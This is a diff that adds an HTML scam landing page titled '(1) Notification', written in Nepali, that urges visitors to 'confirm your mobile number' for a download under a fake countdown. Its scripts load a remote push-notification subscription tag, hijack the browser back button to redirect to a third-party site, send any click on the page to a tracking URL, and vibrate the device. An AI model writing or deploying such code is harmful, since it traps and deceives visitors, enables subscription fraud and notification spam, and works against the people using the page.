@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>(1) Notification</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link rel="shortcut icon" type="image/jpg" href="alert.jpg" />
+	
+	
+	
+	
+	<script>
+    //PP
+    var s = document.createElement('script');
+    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5168327'+'&sw=/sw-check-permissions-ea2cf.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+
+
+<script> 
+//BB
+function imiBB() { let url = "https://app.impih.com/?utm_medium=9afb263ead84fd656a37a10f917fc288156a2bdb&utm_campaign=WW&2=bbr&np=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+
+	
+	
+	
+	
+</head>
+
+<body>
+	<script src="count_down.js" type="text/javascript"></script>
+	<div class="wrapper">
+		<div class="wrap"><img class="imgpict" src="pict.jpg" alt="" />
+			<div class="txt0">तपाईंको डाउनलोड तयार छ</div>
+			<div class="contentwrap">
+				<div class="txt">भित्र आफ्नो मोबाइल नम्बर पुष्टि गर्नुहोस्
+					<span id="cdown4948"></span>
+					ثانية
+					<script>
+						countdown("cdown4948", 60, "s", "");
+					</script>
+
+				</div>
+				<div class="txt1"></div>
+				<div class="btnclick"><a href="https://k2.maxconvv.com/click" class="button">अब पुष्टि गर्नुहोस्</a></div>
+			</div>
+			<div class="txt2"><span style="font-size: 12px;">&copy; # 1 सामग्री डाउनलोड गर्नुहोस्</span></div>
+		</div>
+	</div>
+	<script>
+		navigator.vibrate([1000, 300, 1000, 300, 1000]);
+	</script>
+	
+	<!--Click-->
+	<script type="text/javascript">
+		document.body.addEventListener('click', function () { window.location = 'https://k2.maxconvv.com/click'; }, false);
+	</script>
+	
+	<!--Timeout-->
+	
+	<style>
+		.dtpcnt {
+			opacity: 0;
+		}
+	</style>
+</body>
+
+</html>
